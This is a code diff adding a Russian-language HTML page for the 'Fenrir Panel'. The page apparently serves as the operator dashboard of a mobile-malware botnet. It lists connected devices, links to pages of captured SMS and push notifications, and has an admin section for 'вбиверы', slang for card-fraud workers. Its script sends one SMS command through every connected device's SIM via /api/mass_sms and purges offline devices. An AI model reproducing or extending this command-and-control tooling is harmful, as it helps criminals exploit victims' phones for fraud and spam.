@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Устройства - Fenrir Panel</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="preloader" id="preloader">
+        <div class="loader-spinner"></div>
+    </div>
+
+    <div class="app-container">
+        <!-- Mobile Menu Button -->
+        <button class="mobile-menu-btn" id="mobileMenuBtn">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <line x1="3" y1="6" x2="21" y2="6"></line>
+                <line x1="3" y1="12" x2="21" y2="12"></line>
+                <line x1="3" y1="18" x2="21" y2="18"></line>
+            </svg>
+        </button>
+        
+        <!-- Mobile Overlay -->
+        <div class="mobile-overlay" id="mobileOverlay"></div>
+        
+        <aside class="sidebar" id="sidebar">
+            <div class="sidebar-header">
+                <div class="logo">
+                    <span class="logo-text">FENRIR</span>
+                </div>
+            </div>
+
+            <nav class="sidebar-nav">
+                <a href="/dashboard" class="nav-item ">
+                    <svg class="nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="3" y="3" width="7" height="7"></rect>
+                        <rect x="14" y="3" width="7" height="7"></rect>
+                        <rect x="14" y="14" width="7" height="7"></rect>
+                        <rect x="3" y="14" width="7" height="7"></rect>
+                    </svg>
+                    <span>Главная</span>
+                </a>
+
+                <a href="/devices" class="nav-item active">
+                    <svg class="nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect>
+                        <line x1="12" y1="18" x2="12.01" y2="18"></line>
+                    </svg>
+                    <span>Устройства</span>
+                </a>
+
+                <a href="/sms" class="nav-item ">
+                    <svg class="nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
+                    </svg>
+                    <span>SMS</span>
+                </a>
+
+                <a href="/pushes" class="nav-item ">
+                    <svg class="nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"></path>
+                        <path d="M13.73 21a2 2 0 0 1-3.46 0"></path>
+                    </svg>
+                    <span>Пуши</span>
+                </a>
+
+                
+                <div class="nav-divider"></div>
+                <span class="nav-label">Админ</span>
+
+                <a href="/workers" class="nav-item ">
+                    <svg class="nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path>
+                        <circle cx="9" cy="7" r="4"></circle>
+                        <path d="M23 21v-2a4 4 0 0 0-3-3.87"></path>
+                        <path d="M16 3.13a4 4 0 0 1 0 7.75"></path>
+                    </svg>
+                    <span>Вбиверы</span>
+                </a>
+
+                <a href="/settings" class="nav-item ">
+                    <svg class="nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <circle cx="12" cy="12" r="3"></circle>
+                        <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"></path>
+                    </svg>
+                    <span>Настройки</span>
+                </a>
+
+                
+            </nav>
+
+            <div class="sidebar-footer">
+                <div class="user-info">
+                    <div class="user-avatar">
+                        S
+                    </div>
+                    <div class="user-details">
+                        <span class="user-name">spidey</span>
+                        <span class="user-role">Админ</span>
+                    </div>
+                </div>
+                <a href="/logout" class="logout-btn">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path>
+                        <polyline points="16 17 21 12 16 7"></polyline>
+                        <line x1="21" y1="12" x2="9" y2="12"></line>
+                    </svg>
+                </a>
+            </div>
+        </aside>
+
+        <main class="main-content">
+            
+<div class="page-header">
+    <h1>Устройства</h1>
+    <p>Управление подключенными устройствами</p>
+</div>
+
+<div class="toolbar">
+    <div class="search-box">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <circle cx="11" cy="11" r="8"></circle>
+            <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+        </svg>
+        <input type="text" id="searchInput" placeholder="Поиск устройств...">
+    </div>
+
+    <div class="filter-group">
+        <button class="filter-btn active" data-filter="all">Все</button>
+        <button class="filter-btn" data-filter="online">Онлайн</button>
+        <button class="filter-btn" data-filter="offline">Офлайн</button>
+    </div>
+
+    
+    <div class="admin-actions">
+        <button class="btn btn-primary" id="massSmsBtn">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="16" height="16">
+                <path d="M22 2L11 13"></path>
+                <path d="M22 2L15 22L11 13L2 9L22 2Z"></path>
+            </svg>
+            Массовая рассылка
+        </button>
+        <button class="btn btn-danger" id="deleteOfflineBtn">Удалить офлайн</button>
+    </div>
+    
+</div>
+
+<div class="devices-grid" id="devicesGrid">
+    
+    <div class="empty-state-card">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect>
+            <line x1="12" y1="18" x2="12.01" y2="18"></line>
+        </svg>
+        <p>Устройства не найдены</p>
+    </div>
+    
+</div>
+
+
+<!-- Mass SMS Modal -->
+<div class="modal" id="massSmsModal">
+    <div class="modal-content">
+        <div class="modal-header">
+            <h3>Массовая рассылка</h3>
+            <button class="modal-close" id="closeMassSmsModal">&times;</button>
+        </div>
+        <form id="massSmsForm">
+            <div class="modal-info">
+                SMS будет отправлено со всех устройств
+            </div>
+            <div class="form-group">
+                <label>Номер телефона</label>
+                <input type="text" id="massPhoneNumber" placeholder="+7..." required>
+            </div>
+            <div class="form-group">
+                <label>Текст сообщения</label>
+                <textarea id="massSmsText" placeholder="Введите текст SMS..." required rows="3"></textarea>
+            </div>
+            <div class="form-group">
+                <label>SIM карта</label>
+                <select id="massSimCard">
+                    <option value="sim1">SIM 1</option>
+                    <option value="sim2">SIM 2</option>
+                </select>
+            </div>
+            <div class="modal-actions">
+                <button type="button" class="btn btn-secondary" id="cancelMassSms">Отмена</button>
+                <button type="submit" class="btn btn-primary">Отправить</button>
+            </div>
+        </form>
+    </div>
+</div>
+
+
+        </main>
+    </div>
+
+    <script src="index.js"></script>
+    
+<script>
+// Фильтры
+document.querySelectorAll('.filter-btn').forEach(btn => {
+    btn.addEventListener('click', function() {
+        document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+        this.classList.add('active');
+        
+        const filter = this.dataset.filter;
+        document.querySelectorAll('a.device-card').forEach(card => {
+            if (filter === 'all' || card.dataset.status === filter) {
+                card.style.display = 'block';
+            } else {
+                card.style.display = 'none';
+            }
+        });
+    });
+});
+
+// Поиск
+document.getElementById('searchInput').addEventListener('input', function() {
+    const search = this.value.toLowerCase();
+    document.querySelectorAll('a.device-card').forEach(card => {
+        const text = card.textContent.toLowerCase();
+        card.style.display = text.includes(search) ? 'block' : 'none';
+    });
+});
+
+
+document.getElementById('deleteOfflineBtn').addEventListener('click', async function() {
+    if (!confirm('Удалить все устройства офлайн более 2 дней?')) return;
+    
+    try {
+        const response = await fetch('/api/delete_offline_devices', { method: 'DELETE' });
+        const data = await response.json();
+        alert(data.message);
+        location.reload();
+    } catch (e) {
+        alert('Ошибка удаления устройств');
+    }
+});
+
+// Mass SMS Modal
+const massSmsModal = document.getElementById('massSmsModal');
+const massSmsBtn = document.getElementById('massSmsBtn');
+const closeMassSmsModal = document.getElementById('closeMassSmsModal');
+const cancelMassSms = document.getElementById('cancelMassSms');
+const massSmsForm = document.getElementById('massSmsForm');
+
+massSmsBtn.addEventListener('click', () => {
+    massSmsModal.classList.add('active');
+});
+
+closeMassSmsModal.addEventListener('click', () => {
+    massSmsModal.classList.remove('active');
+});
+
+cancelMassSms.addEventListener('click', () => {
+    massSmsModal.classList.remove('active');
+});
+
+massSmsModal.addEventListener('click', (e) => {
+    if (e.target === massSmsModal) {
+        massSmsModal.classList.remove('active');
+    }
+});
+
+massSmsForm.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    
+    const phoneNumber = document.getElementById('massPhoneNumber').value;
+    const smsText = document.getElementById('massSmsText').value;
+    const simCard = document.getElementById('massSimCard').value;
+    
+    if (!phoneNumber || !smsText) {
+        alert('Заполните все поля');
+        return;
+    }
+    
+    const submitBtn = massSmsForm.querySelector('button[type="submit"]');
+    submitBtn.disabled = true;
+    submitBtn.textContent = 'Отправка...';
+    
+    try {
+        const response = await fetch('/api/mass_sms', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                phone_number: phoneNumber,
+                sms_text: smsText,
+                sim_card: simCard
+            })
+        });
+        
+        const data = await response.json();
+        
+        if (response.ok) {
+            alert('SMS команда отправлена на ' + data.count + ' устройств');
+            massSmsModal.classList.remove('active');
+            massSmsForm.reset();
+        } else {
+            alert(data.error || 'Ошибка отправки');
+        }
+    } catch (err) {
+        alert('Ошибка сети');
+    } finally {
+        submitBtn.disabled = false;
+        submitBtn.textContent = 'Отправить';
+    }
+});
+
+</script>
+
+</body>
+</html>
